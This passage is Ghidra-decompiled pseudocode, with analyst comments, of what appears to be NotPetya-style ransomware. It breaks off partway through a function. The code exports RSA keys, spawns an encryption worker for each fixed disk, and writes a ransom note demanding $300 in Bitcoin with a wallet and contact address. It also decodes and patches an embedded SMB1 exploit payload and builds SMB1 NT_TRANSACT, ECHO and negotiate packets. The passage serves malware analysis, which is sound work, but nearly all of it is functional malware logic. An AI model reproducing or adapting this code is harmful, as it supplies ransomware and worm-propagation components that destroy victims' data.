 * Ghidra symbol: FUN_10001c7f | VA: 0x10001C7F | original source line: 1738
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: CryptExportKey, CryptBinaryToStringW
 * Direct function references: none mapped
 */
LPWSTR SerializeCryptoIdentifier_10001C7F(void)

{
  int in_EAX;
  BOOL BVar1;
  BYTE *pbData;
  LPWSTR pszString;
  LPWSTR local_14;
  DWORD local_c;
  DWORD local_8;
  
  local_14 = (LPWSTR)0x0;
  local_8 = 0;
  BVar1 = CryptExportKey(*(HCRYPTKEY *)(in_EAX + 0x14),*(HCRYPTKEY *)(in_EAX + 0xc),1,0,(BYTE *)0x0,
                         &local_8);
  if (BVar1 != 0) {
    pbData = LocalAlloc(0x40,local_8);
    if (pbData != (BYTE *)0x0) {
      BVar1 = CryptExportKey(*(HCRYPTKEY *)(in_EAX + 0x14),*(HCRYPTKEY *)(in_EAX + 0xc),1,0,pbData,
                             &local_8);
      if (BVar1 != 0) {
        local_c = 0;
        BVar1 = CryptBinaryToStringW(pbData,local_8,1,(LPWSTR)0x0,&local_c);
        if (BVar1 != 0) {
          pszString = LocalAlloc(0x40,local_c * 2);
          if (pszString != (LPWSTR)0x0) {
            BVar1 = CryptBinaryToStringW(pbData,local_8,1,pszString,&local_c);
            if (BVar1 == 0) {
              LocalFree(pszString);
            }
            else {
              local_14 = pszString;
            }
          }
        }
      }
      LocalFree(pbData);
    }
  }
  return local_14;
}



/*
 * RECONSTRUCTED FUNCTION: CreateDirectoryRansomNote_10001D32
 * Ghidra symbol: FUN_10001d32 | VA: 0x10001D32 | original source line: 1782
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileW, WriteFile
 * Direct function references: BuildFileCryptoIdentifier_10001BA0, SerializeCryptoIdentifier_10001C7F, ComputeElapsedTimeInterval_10006973
 */
void CreateDirectoryRansomNote_10001D32(LPCWSTR param_1)

{
  WCHAR WVar1;
  BOOL BVar2;
  LPWSTR pWVar3;
  uint uVar4;
  HANDLE hFile;
  WCHAR local_624 [780];
  LPWSTR local_c;
  DWORD local_8;
  
  BVar2 = BuildFileCryptoIdentifier_10001BA0((int)param_1);
  if ((BVar2 != 0) && (local_c = SerializeCryptoIdentifier_10001C7F(), local_c != (LPWSTR)0x0)) {
    pWVar3 = PathCombineW(local_624,param_1,L"README.TXT");
    if (pWVar3 != (LPWSTR)0x0) {
      uVar4 = ComputeElapsedTimeInterval_10006973();
      if (uVar4 != 0) {
        Sleep((uVar4 - 1) * 60000);
      }
      hFile = CreateFileW(local_624,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
      if (hFile != (HANDLE)0xffffffff) {
        local_8 = 0;
        WriteFile(hFile,
                  L"Ooops, your important files are encrypted.\r\n\r\nIf you see this text, then your files are no longer accessible, because\r\nthey have been encrypted. Perhaps you are busy looking for a way to recover\r\nyour files, but don\'t waste your time. Nobody can recover your files without\r\nour decryption service.\r\n\r\nWe guarantee that you can recover all your files safely and easily.\r\nAll you need to do is submit the payment and purchase the decryption key.\r\n\r\nPlease follow the instructions:\r\n\r\n1.\tSend $300 worth of Bitcoin to following address:\r\n\r\n"
                  ,0x432,&local_8,(LPOVERLAPPED)0x0);
        WriteFile(hFile,L"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\r\n\r\n",0x4c,&local_8,
                  (LPOVERLAPPED)0x0);
        WriteFile(hFile,L"2.\tSend your Bitcoin wallet ID and personal installation key to e-mail ",
                  0x8e,&local_8,(LPOVERLAPPED)0x0);
        WriteFile(hFile,L"wowsmith123456@posteo.net.\r\n",0x38,&local_8,(LPOVERLAPPED)0x0);
        WriteFile(hFile,L"\tYour personal installation key:\r\n\r\n",0x48,&local_8,(LPOVERLAPPED)0x0
                 );
        pWVar3 = local_c;
        do {
          WVar1 = *pWVar3;
          pWVar3 = pWVar3 + 1;
        } while (WVar1 != L'\0');
        WriteFile(hFile,local_c,((int)pWVar3 - (int)(local_c + 1) >> 1) * 2,&local_8,
                  (LPOVERLAPPED)0x0);
        CloseHandle(hFile);
      }
    }
    LocalFree(*(HLOCAL *)(param_1 + 0xc));
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: FileCryptoWorker_10001E51
 * Ghidra symbol: FUN_10001e51 | VA: 0x10001E51 | original source line: 1832
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: CryptAcquireContextW, GetLastError, CryptAcquireContextW, CryptDestroyKey, CryptReleaseContext
 * Direct function references: WalkMatchingFilesRecursively_10001973, InitializeFileEncryptionKeyMaterial_10001B4E, CreateDirectoryRansomNote_10001D32
 */
undefined4 FileCryptoWorker_10001E51(LPCWSTR param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  wchar_t *szProvider;
  
  BVar1 = CryptAcquireContextW
                    ((HCRYPTPROV *)(param_1 + 4),(LPCWSTR)0x0,
                     L"Microsoft Enhanced RSA and AES Cryptographic Provider",0x18,0xf0000000);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    if (DVar2 == 0x80090019) {
      DVar2 = 0xf0000000;
      szProvider = (LPCWSTR)0x0;
    }
    else {
      if (DVar2 != 0x80090016) goto LAB_10001edf;
      DVar2 = 8;
      szProvider = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
    }
    BVar1 = CryptAcquireContextW((HCRYPTPROV *)(param_1 + 4),(LPCWSTR)0x0,szProvider,0x18,DVar2);
    if (BVar1 == 0) goto LAB_10001edf;
  }
  BVar1 = InitializeFileEncryptionKeyMaterial_10001B4E();
  if (BVar1 != 0) {
    WalkMatchingFilesRecursively_10001973(param_1,0xf,(int)param_1);
    CreateDirectoryRansomNote_10001D32(param_1);
    CryptDestroyKey(*(HCRYPTKEY *)(param_1 + 10));
  }
  CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
LAB_10001edf:
  LocalFree(param_1);
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: EnumerateFixedDisksAndSpawnWorkers_10001EEF
 * Ghidra symbol: FUN_10001eef | VA: 0x10001EEF | original source line: 1870
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetLogicalDrives, GetDriveTypeW, CreateThread
 * Direct function references: FileCryptoWorker_10001E51
 */
void EnumerateFixedDisksAndSpawnWorkers_10001EEF(void)

{
  DWORD DVar1;
  UINT UVar2;
  undefined4 *lpParameter;
  int iVar3;
  undefined4 local_c;
  undefined4 local_8;
  
  DVar1 = GetLogicalDrives();
  iVar3 = 0x1f;
  do {
    if ((DVar1 & 1 << ((byte)iVar3 & 0x1f)) != 0) {
      local_c = CONCAT22(0x3a,(short)iVar3 + 0x41);
      local_8 = 0x5c;
      UVar2 = GetDriveTypeW((LPCWSTR)&local_c);
      if (UVar2 == 3) {
        lpParameter = LocalAlloc(0x40,0x20);
        if (lpParameter != (undefined4 *)0x0) {
          lpParameter[4] =
               L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB"
          ;
          lpParameter[7] = 0;
          *lpParameter = local_c;
          lpParameter[1] = local_8;
          CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FileCryptoWorker_10001E51,lpParameter,0,(LPDWORD)0x0);
        }
      }
    }
    iVar3 = iVar3 + -1;
  } while (-1 < iVar3);
  return;
}



/*
 * RECONSTRUCTED FUNCTION: ComposeStagedPayloadBuffer_10001F74
 * Ghidra symbol: FUN_10001f74 | VA: 0x10001F74 | original source line: 1907
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: none mapped
 */
uint ComposeStagedPayloadBuffer_10001F74(void *param_1,size_t param_2,void *param_3,size_t param_4,void *param_5,
                 size_t param_6,int *param_7,uint *param_8,void *param_9,uint param_10,
                 void *param_11,uint param_12)

{
  uint uVar1;
  HANDLE hHeap;
  LPVOID _Dst;
  void *pvVar2;
  void *_Dst_00;
  DWORD dwFlags;
  
  uVar1 = param_4 + 0x76fc2 + param_6;
  *param_8 = uVar1;
  if (0x1fff < param_10) {
    param_10 = 0x1fff;
  }
  if (0x80 < param_12) {
    param_12 = 0x7f;
  }
  if (uVar1 < param_2 + param_4 + 0x481c + param_6) {
    uVar1 = uVar1 & 0xffffff00;
  }
  else {
    dwFlags = 8;
    hHeap = GetProcessHeap();
    _Dst = HeapAlloc(hHeap,dwFlags,uVar1);
    *param_7 = (int)_Dst;
    pvVar2 = memcpy(_Dst,param_3,param_4);
    if (pvVar2 != (void *)0x0) {
      _Dst_00 = (void *)((int)_Dst + param_4);
      pvVar2 = memcpy(_Dst_00,param_11,param_12 * 2);
      if ((pvVar2 != (void *)0x0) &&
         (pvVar2 = memcpy((void *)((int)_Dst_00 + 0x100),param_9,param_10 * 2),
         pvVar2 != (void *)0x0)) {
        *(size_t *)((int)_Dst_00 + 0x4818) = param_2;
        pvVar2 = memcpy((void *)((int)_Dst_00 + 0x481c),param_1,param_2);
        if ((pvVar2 != (void *)0x0) &&
           (pvVar2 = memcpy((void *)(*param_7 + 0x76fc2 + param_4),param_5,param_6),
           pvVar2 != (void *)0x0)) {
          return CONCAT31((int3)((uint)pvVar2 >> 8),1);
        }
      }
    }
    uVar1 = 0;
  }
  return uVar1;
}



/*
 * RECONSTRUCTED FUNCTION: WinsockCleanupAfterAttempt_10002068
 * Ghidra symbol: FUN_10002068 | VA: 0x10002068 | original source line: 1958
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: Ordinal_3
 * Direct function references: none mapped
 * ANALYST OBSERVATION: Winsock cleanup interpretation is provisional pending import-ordinal verification.
 */
void WinsockCleanupAfterAttempt_10002068(void)

{
  int *in_EAX;
  int iVar1;
  
  iVar1 = 0x15;
  do {
    if (*in_EAX != 0) {
      Ordinal_3(*in_EAX);
    }
    *in_EAX = -1;
    in_EAX = in_EAX + 1;
    iVar1 = iVar1 + -1;
  } while (iVar1 != 0);
  return;
}



/*
 * RECONSTRUCTED FUNCTION: ReadWinsockLibraryStatus_10002088
 * Ghidra symbol: FUN_10002088 | VA: 0x10002088 | original source line: 1978
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined4 ReadWinsockLibraryStatus_10002088(int param_1,int param_2)

{
  uint uVar1;
  undefined4 uVar2;
  
  uVar1 = param_2 + 0xfff + (uint)(param_1 != 0);
  if ((uVar1 < 0xfff) && ((uVar1 < 0xffe || (param_1 != 0)))) {
    uVar2 = 1;
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: GetTickCounterLowWord_100020B2
 * Ghidra symbol: FUN_100020b2 | VA: 0x100020B2 | original source line: 1996
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetTickCount
 * Direct function references: none mapped
 */
uint GetTickCounterLowWord_100020B2(void)

{
  uint uVar1;
  DWORD DVar2;
  uint uVar3;
  
  DVar2 = GetTickCount();
  uVar1 = DVar2 + 0x40 + DAT_1001fb48;
  uVar3 = uVar1 & 0xffff;
  if ((short)uVar1 == 0) {
    uVar3 = 0x40;
  }
  return uVar3;
}



/*
 * RECONSTRUCTED FUNCTION: ReleaseTemporaryNetworkBuffer_100020D0
 * Ghidra symbol: FUN_100020d0 | VA: 0x100020D0 | original source line: 2014
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: none mapped
 */
void ReleaseTemporaryNetworkBuffer_100020D0(void)

{
  HANDLE hHeap;
  int *unaff_ESI;
  DWORD dwFlags;
  LPVOID lpMem;
  
  lpMem = (LPVOID)*unaff_ESI;
  if (lpMem != (LPVOID)0x0) {
    dwFlags = 8;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,lpMem);
    *unaff_ESI = 0;
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: DecodeAndAdaptEmbeddedSmbPayload_100020EA
 * Ghidra symbol: FUN_100020ea | VA: 0x100020EA | original source line: 2034
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: FindResourceW
 * Direct function references: AllocateZeroedHeapBuffer_10001000, DecompressWin32Resource_100085D0
 * Local name rewrites: pHVar4 -> embedded_resource_handle, SVar2 -> decoded_resource_length
 * Parameter names recovered semantically: param_1 -> payload_size_out, param_2 -> payload_patch_context, param_3 -> payload_variant
 * ANALYST OBSERVATION: Resource ID 4 is decoded and adjusted for a selected protocol/target variant.
 * ANALYST OBSERVATION: This is a likely exploit payload preparation stage; its CVE attribution is not uniquely recoverable from the resource name alone.
 */
undefined4 DecodeAndAdaptEmbeddedSmbPayload_100020EA(SIZE_T *payload_size_out,int payload_patch_context,char payload_variant)

{
  byte *pbVar1;
  SIZE_T decoded_resource_length;
  char cVar3;
  HRSRC embedded_resource_handle;
  int iVar5;
  int *unaff_ESI;
  uint uVar6;
  
  cVar3 = g_smb_payload_variant;
  uVar6 = 0;
  if (g_smb_payload_variant == '\0') {
    embedded_resource_handle = FindResourceW(DAT_1001f120,(LPCWSTR)0x4,(LPCWSTR)0xa);
    if (embedded_resource_handle == (HRSRC)0x0) {
      iVar5 = 0;
    }
    else {
      iVar5 = DecompressWin32Resource_100085D0(payload_size_out,embedded_resource_handle);
    }
    if (iVar5 == 0) {
      return 0xffffffff;
    }
    decoded_resource_length = *payload_size_out;
    if (decoded_resource_length != 1) {
      do {
        *(uint *)(*unaff_ESI + uVar6) = *(uint *)(*unaff_ESI + uVar6) ^ 0x86868686;
        uVar6 = uVar6 + 4;
      } while (uVar6 < decoded_resource_length - 1);
    }
    pbVar1 = (byte *)(*unaff_ESI + -1 + decoded_resource_length);
    *pbVar1 = *pbVar1 ^ 0x86;
    *(int *)(*unaff_ESI + 0x591) = payload_patch_context + 0xd70;
    if (payload_variant == '\x02') {
      *(undefined1 *)(*unaff_ESI + 0x26) = 0xa0;
      *(undefined1 *)(*unaff_ESI + 0x52) = 0x90;
      *(undefined2 *)(*unaff_ESI + 0x270) = 0x164;
      *(undefined2 *)(*unaff_ESI + 0x29e) = 0;
      *(undefined1 *)(*unaff_ESI + 0x2b6) = 0;
    }
    if (payload_variant == '\x03') {
      *(undefined1 *)(*unaff_ESI + 0x26) = 0x90;
      *(undefined1 *)(*unaff_ESI + 0x52) = 0x80;
      *(undefined1 *)(*unaff_ESI + 0x270) = 0x58;
      *(undefined1 *)(*unaff_ESI + 0x2b6) = 0;
    }
    if ((payload_variant != '\x04') && (payload_variant != '\x06')) {
      return 0;
    }
    *(undefined1 *)(*unaff_ESI + 0x26) = 0x78;
    *(undefined1 *)(*unaff_ESI + 0x52) = 0x68;
    *(undefined1 *)(*unaff_ESI + 0x270) = 0x68;
  }
  if (cVar3 == '\x01') {
    *payload_size_out = 0x17f8;
    iVar5 = AllocateZeroedHeapBuffer_10001000(0x17f8);
    *unaff_ESI = iVar5;
    if (iVar5 == 0) {
      return 0xffffffff;
    }
    if (uVar6 < *payload_size_out - 1) {
      decoded_resource_length = *payload_size_out;
      do {
        *(uint *)(uVar6 + *unaff_ESI) = *(uint *)(&UNK_10010bb8 + uVar6) ^ 0x64646464;
        uVar6 = uVar6 + 4;
      } while (uVar6 < decoded_resource_length - 1);
    }
    *(int *)(*unaff_ESI + 0x86e) = payload_patch_context + 0xf8a;
    if ((payload_variant == '\x02') || (payload_variant == '\x03')) {
      *(undefined2 *)(*unaff_ESI + 0x846) = 0x2b0;
      *(undefined2 *)(*unaff_ESI + 0x852) = 0x290;
      *(undefined1 *)(*unaff_ESI + 0x856) = 0x90;
      *(undefined1 *)(*unaff_ESI + 0x85e) = 0;
    }
    if ((payload_variant == '\x04') || (payload_variant == '\x06')) {
      *(undefined2 *)(*unaff_ESI + 0x846) = 0x280;
      *(undefined2 *)(*unaff_ESI + 0x852) = 0x260;
      *(undefined1 *)(*unaff_ESI + 0x856) = 0x90;
    }
  }
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1ParseServerReplyVersion_100022A2
 * Ghidra symbol: FUN_100022a2 | VA: 0x100022A2 | original source line: 2120
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined1 Smb1ParseServerReplyVersion_100022A2(ushort param_1)

{
  ushort uVar1;
  int iVar2;
  int iVar3;
  int in_EAX;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  if ((param_1 < 0x2d) || (uVar4 = (uint)*(ushort *)(in_EAX + 0x2b), uVar4 < 8)) {
    return 0xff;
  }
  if ((uint)param_1 < uVar4 + 0x2d) {
    return 0xff;
  }
  uVar1 = 0;
  if (uVar4 != 8) {
    uVar6 = 0;
    do {
      iVar2 = *(int *)(uVar6 + 0x2d + in_EAX);
      iVar3 = *(int *)(uVar6 + 0x31 + in_EAX);
      if ((iVar2 == 0x350020) && (iVar3 == 0x31002e)) {
        return 2;
      }
      if ((iVar2 == 0x350020) && (iVar3 == 0x32002e)) {
        return 3;
      }
      if ((iVar2 == 0x690056) && (iVar3 == 0x740073)) {
        return 4;
      }
      if ((iVar2 == 0x730077) && (iVar3 == 0x370020)) {
        return 5;
      }
      if ((iVar2 == 0x300032) && (iVar3 == 0x380030)) {
        uVar5 = 0;
        uVar6 = 0;
        while ((*(int *)(uVar6 + 0x2d + in_EAX) != 0x200038 ||
               (*(int *)(uVar6 + 0x31 + in_EAX) != 0x320052))) {
          uVar5 = uVar5 + 1;
          uVar6 = uVar5 & 0xffff;
          if (uVar4 - 8 <= uVar6) {
            return 6;
          }
        }
        return 7;
      }
      uVar1 = uVar1 + 1;
      uVar6 = (uint)uVar1;
    } while (uVar6 < uVar4 - 8);
  }
  uVar6 = 0;
  if (uVar4 == 4) {
    return 0xff;
  }
  uVar5 = 0;
  while( true ) {
    iVar2 = *(int *)(uVar5 + 0x2d + in_EAX);
    if (iVar2 == 0x312e3520) {
      return 2;
    }
    if (iVar2 == 0x322e3520) {
      return 3;
    }
    if (iVar2 == 0x74736956) {
      return 4;
    }
    if (iVar2 == 0x37207377) break;
    if (iVar2 == 0x38303032) {
      uVar5 = 0;
      uVar6 = 0;
      do {
        if (*(int *)(uVar6 + 0x2d + in_EAX) == 0x32522038) {
          return 7;
        }
        uVar5 = uVar5 + 1;
        uVar6 = uVar5 & 0xffff;
      } while (uVar6 < uVar4 - 4);
      return 6;
    }
    uVar6 = uVar6 + 1;
    uVar5 = uVar6 & 0xffff;
    if (uVar4 - 4 <= uVar5) {
      return 0xff;
    }
  }
  return 5;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1TransmitRequestBuffer_1000243F
 * Ghidra symbol: FUN_1000243f | VA: 0x1000243F | original source line: 2212
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: Smb1SendFramedNetworkPacket_100067AF
 */
int Smb1TransmitRequestBuffer_1000243F(undefined4 param_1,byte param_2)

{
  int iVar1;
  int local_8;
  
  local_8 = 0x1000;
  iVar1 = Smb1SendFramedNetworkPacket_100067AF(param_1,param_2,&local_8);
  return -(uint)(iVar1 != 0);
}



/*
 * RECONSTRUCTED FUNCTION: Smb1BuildProtocolHeader_10002466
 * Ghidra symbol: FUN_10002466 | VA: 0x10002466 | original source line: 2225
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: Ordinal_9
 * Direct function references: AllocateZeroedHeapBuffer_10001000
 * Local name rewrites: iVar2 -> smb_header_allocation, uVar1 -> encoded_packet_length
 * Parameter names recovered semantically: param_1 -> packet_payload_size, param_2 -> smb_command
 * ANALYST OBSERVATION: Writes a recognizable SMB1 protocol marker, 0x424D53FF (FF SMB).
 * ANALYST OBSERVATION: This establishes that the surrounding packet helpers implement SMB1 wire framing.
 */
int Smb1BuildProtocolHeader_10002466(int packet_payload_size,undefined1 smb_command,undefined2 param_3,undefined2 param_4,
                undefined2 param_5,undefined2 param_6,undefined2 param_7,undefined2 param_8)

{
  undefined2 encoded_packet_length;
  int smb_header_allocation;
  
  smb_header_allocation = AllocateZeroedHeapBuffer_10001000(0x24);
  if (smb_header_allocation != 0) {
    encoded_packet_length = Ordinal_9(packet_payload_size + -4);
    *(undefined2 *)(smb_header_allocation + 2) = encoded_packet_length;
    *(undefined1 *)(smb_header_allocation + 8) = smb_command;
    *(undefined2 *)(smb_header_allocation + 0xe) = param_3;
    *(undefined2 *)(smb_header_allocation + 0x10) = param_4;
    *(undefined2 *)(smb_header_allocation + 0x1c) = param_5;
    *(undefined2 *)(smb_header_allocation + 0x1e) = param_6;
    *(undefined2 *)(smb_header_allocation + 0x20) = param_7;
    *(undefined2 *)(smb_header_allocation + 0x22) = param_8;
    *(undefined4 *)(smb_header_allocation + 4) = 0x424d53ff;
    *(undefined1 *)(smb_header_allocation + 0xd) = 0x18;
  }
  return smb_header_allocation;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1BuildNtTransactBody_100024D0
 * Ghidra symbol: FUN_100024d0 | VA: 0x100024D0 | original source line: 2251
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000
 */
undefined2 * __fastcall Smb1BuildNtTransactBody_100024D0(undefined4 param_1,undefined2 *param_2,void *param_3)

{
  undefined2 *puVar1;
  
  if (param_3 == (void *)0x0) {
    puVar1 = (undefined2 *)0x0;
  }
  else {
    *param_2 = 0x418;
    puVar1 = (undefined2 *)AllocateZeroedHeapBuffer_10001000(0x418);
    if (puVar1 != (undefined2 *)0x0) {
      *(undefined4 *)(puVar1 + 2) = 0x1e;
      *(undefined4 *)(puVar1 + 6) = 0x1e;
      *(undefined4 *)(puVar1 + 10) = 0x1e;
      *puVar1 = 0x114;
      *(undefined4 *)(puVar1 + 4) = 0x103d0;
      *(undefined4 *)(puVar1 + 0xc) = 0x4b;
      *(undefined4 *)(puVar1 + 0xe) = 0x3d0;
      *(undefined4 *)(puVar1 + 0x10) = 0x68;
      *(undefined1 *)(puVar1 + 0x12) = 1;
      *(undefined2 *)((int)puVar1 + 0x29) = 0x3ec;
      memcpy(puVar1 + 0x16,param_3,0x3ec);
    }
  }
  return puVar1;
}



undefined4 *
/*
 * RECONSTRUCTED FUNCTION: Smb1BuildNtTransactRequest_10002547
 * Ghidra symbol: FUN_10002547 | VA: 0x10002547 | original source line: 2282
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildProtocolHeader_10002466, Smb1BuildNtTransactBody_100024D0
 * Local name rewrites: local_c -> nt_transact_body, local_10 -> body_length
 * ANALYST OBSERVATION: Constructs an SMB1 request with command value 0xA0 (NT_TRANSACT).
 */
Smb1BuildNtTransactRequest_10002547(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5)

{
  uint uVar1;
  ushort *in_EAX;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 extraout_ECX;
  int iVar4;
  undefined4 *puVar5;
  uint body_length;
  undefined2 *nt_transact_body;
  void *local_8;
  
  local_8 = (void *)AllocateZeroedHeapBuffer_10001000(0x3ec);
  if (local_8 != (void *)0x0) {
    *(undefined1 *)((int)local_8 + 0x1e) = 1;
    body_length = 0;
    nt_transact_body = Smb1BuildNtTransactBody_100024D0(extraout_ECX,(undefined2 *)&body_length,local_8);
    uVar1 = body_length;
    if (nt_transact_body != (undefined2 *)0x0) {
      *in_EAX = (ushort)(body_length + 0x24);
      puVar2 = (undefined4 *)
               Smb1BuildProtocolHeader_10002466(body_length + 0x24,0xa0,0xc007,param_1,param_2,param_3,param_4,param_5);
      if (puVar2 == (undefined4 *)0x0) {
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        return (undefined4 *)0x0;
      }
      puVar3 = (undefined4 *)AllocateZeroedHeapBuffer_10001000((uint)*in_EAX);
      puVar5 = (undefined4 *)0x0;
      if (puVar3 != (undefined4 *)0x0) {
        puVar5 = puVar3;
        for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {
          *puVar5 = *puVar2;
          puVar2 = puVar2 + 1;
          puVar5 = puVar5 + 1;
        }
        memcpy(puVar3 + 9,nt_transact_body,uVar1 & 0xffff);
        puVar5 = puVar3;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
      return puVar5;
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return (undefined4 *)0x0;
}



undefined4 *
/*
 * RECONSTRUCTED FUNCTION: Smb1BuildEchoRequest_10002620
 * Ghidra symbol: FUN_10002620 | VA: 0x10002620 | original source line: 2337
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildProtocolHeader_10002466
 * ANALYST OBSERVATION: Constructs an SMB1 request with command value 0x2B (ECHO).
 */
Smb1BuildEchoRequest_10002620(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,ushort *param_6)

{
  byte *pbVar1;
  byte *pbVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  int iVar6;
  undefined4 *puVar7;
  
  pbVar1 = (byte *)AllocateZeroedHeapBuffer_10001000(0xc);
  if (pbVar1 != (byte *)0x0) {
    *(undefined4 *)pbVar1 = DAT_10016014;
    *(undefined4 *)(pbVar1 + 4) = DAT_10016018;
    *(undefined2 *)(pbVar1 + 8) = DAT_1001601c;
    pbVar1[10] = DAT_1001601e;
    iVar6 = 0xb;
    pbVar2 = pbVar1;
    do {
      *pbVar2 = *pbVar2 ^ 0x2b;
      pbVar2 = pbVar2 + 1;
      iVar6 = iVar6 + -1;
    } while (iVar6 != 0);
    puVar3 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0x11);
    if (puVar3 == (undefined4 *)0x0) {
      puVar3 = (undefined4 *)0x0;
    }
    else {
      *(undefined2 *)((int)puVar3 + 1) = 1;
      *(undefined1 *)puVar3 = 1;
      *(undefined2 *)((int)puVar3 + 3) = 0xc;
      *(undefined4 *)((int)puVar3 + 5) = *(undefined4 *)pbVar1;
      *(undefined4 *)((int)puVar3 + 9) = *(undefined4 *)(pbVar1 + 4);
      *(undefined4 *)((int)puVar3 + 0xd) = *(undefined4 *)(pbVar1 + 8);
    }
    if (puVar3 != (undefined4 *)0x0) {
      *param_6 = 0x35;
      puVar4 = (undefined4 *)Smb1BuildProtocolHeader_10002466(0x35,0x2b,0xc007,param_1,param_2,param_3,param_4,param_5);
      if (puVar4 != (undefined4 *)0x0) {
        puVar5 = (undefined4 *)AllocateZeroedHeapBuffer_10001000((uint)*param_6);
        if (puVar5 == (undefined4 *)0x0) {
          puVar5 = (undefined4 *)0x0;
        }
        else {
          puVar7 = puVar5;
          for (iVar6 = 9; iVar6 != 0; iVar6 = iVar6 + -1) {
            *puVar7 = *puVar4;
            puVar4 = puVar4 + 1;
            puVar7 = puVar7 + 1;
          }
          puVar5[9] = *puVar3;
          puVar5[10] = puVar3[1];
          puVar5[0xb] = puVar3[2];
          puVar5[0xc] = puVar3[3];
          *(undefined1 *)(puVar5 + 0xd) = *(undefined1 *)(puVar3 + 4);
        }
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        return puVar5;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return (undefined4 *)0x0;
}



undefined4 *
/*
 * RECONSTRUCTED FUNCTION: Smb1BuildNegotiateRequest_1000270A
 * Ghidra symbol: FUN_1000270a | VA: 0x1000270A | original source line: 2410
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildProtocolHeader_10002466
 */
Smb1BuildNegotiateRequest_1000270A(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4)

{
  ushort *in_EAX;
  byte *_Dst;
  byte *pbVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  undefined4 *puVar5;
  void *local_c;
  
  _Dst = (byte *)AllocateZeroedHeapBuffer_10001000(0x62);
  if (_Dst != (byte *)0x0) {
    memcpy(_Dst,&DAT_10018ad0,0x62);
    iVar4 = 0x62;
    pbVar1 = _Dst;
    do {
      *pbVar1 = *pbVar1 ^ 0x72;
      pbVar1 = pbVar1 + 1;
      iVar4 = iVar4 + -1;
    } while (iVar4 != 0);
    local_c = (void *)AllocateZeroedHeapBuffer_10001000(0x65);
    if (local_c == (void *)0x0) {
      local_c = (void *)0x0;
    }
    else {
      *(undefined2 *)((int)local_c + 1) = 0x62;
      memcpy((void *)((int)local_c + 3),_Dst,0x62);
    }
    if (local_c != (void *)0x0) {
      *in_EAX = 0x89;
